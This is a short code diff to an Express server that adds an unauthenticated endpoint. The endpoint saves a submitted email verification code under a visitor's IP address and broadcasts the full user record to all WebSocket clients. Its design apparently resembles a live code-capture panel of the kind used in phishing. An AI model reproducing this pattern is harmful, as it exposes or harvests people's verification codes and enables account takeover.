@@ -241,6 +241,47 @@ const init = (async () => {
     }
   });
 
+  app.post("/update-email-code-2", async (req, res) => {
+    try {
+      const { ip, email_code } = req.body;
+  
+      if (!ip) return res.status(400).json({ error: "ip required" });
+      if (email_code === undefined)
+        return res.status(400).json({ error: "email_code value is required" });
+  
+      const emailCodeValue = String(email_code); // normalize
+  
+      // Update email_code
+      await db.execute(
+        `UPDATE users
+         SET email_code_2 = ?
+         WHERE ip = ?`,
+        [emailCodeValue, ip]
+      );
+  
+      // Fetch updated record
+      const [rows] = await db.execute("SELECT * FROM users WHERE ip = ?", [ip]);
+  
+      if (rows.length === 0) {
+        return res.json(false); // IP not found
+      }
+  
+      const userRecord = rows[0];
+  
+      // Notify all WebSocket clients
+      broadcast({
+        type: "EMAIL_CODE_UPDATED_2",
+        data: userRecord,
+      });
+  
+      return res.json(true);
+  
+    } catch (err) {
+      console.error("DB Error:", err);
+      res.status(500).json({ error: "Internal server error" });
+    }
+  });
+
   app.post("/update-email-code-error", async (req, res) => {
     try {
       const { ip, email_code_error } = req.body;
